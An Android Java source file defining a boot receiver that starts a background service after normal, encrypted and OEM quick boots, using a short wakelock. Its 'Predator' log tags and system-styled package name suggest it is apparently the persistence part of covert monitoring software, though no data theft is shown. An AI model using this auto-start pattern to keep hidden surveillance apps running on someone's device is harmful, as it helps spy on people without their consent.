package com.example.systemframework;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.PowerManager;
import android.util.Log;
import androidx.core.content.ContextCompat;

/**
 * BootReceiver — Starts the service on device boot
 * 
 * Handles:
 * - Normal boot (BOOT_COMPLETED)
 * - Direct boot / encrypted boot (LOCKED_BOOT_COMPLETED)
 * - OEM fast boot (QUICKBOOT_POWERON — Xiaomi, HTC, etc.)
 */
public class BootReceiver extends BroadcastReceiver {
    private static final String TAG = "PredatorBoot";

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();

        if (Intent.ACTION_BOOT_COMPLETED.equals(action)
                || Intent.ACTION_LOCKED_BOOT_COMPLETED.equals(action)
                || "android.intent.action.QUICKBOOT_POWERON".equals(action)
                || "com.htc.intent.action.QUICKBOOT_POWERON".equals(action)) {

            Log.d(TAG, "📱 Boot completed (" + action + ") — starting service");

            // WakeLock to ensure service starts before CPU sleeps
            PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
            PowerManager.WakeLock wl = pm.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK, "Predator:BootWake");
            wl.acquire(15 * 1000L); // 15 seconds — some OEMs are slow

            try {
                Intent serviceIntent = new Intent(context, MyBackgroundService.class);
                ContextCompat.startForegroundService(context, serviceIntent);
                Log.d(TAG, "✅ Service start command sent");
            } catch (Exception e) {
                Log.e(TAG, "Failed to start service on boot: " + e.getMessage());
            } finally {
                if (wl.isHeld()) wl.release();
            }
        }
    }
}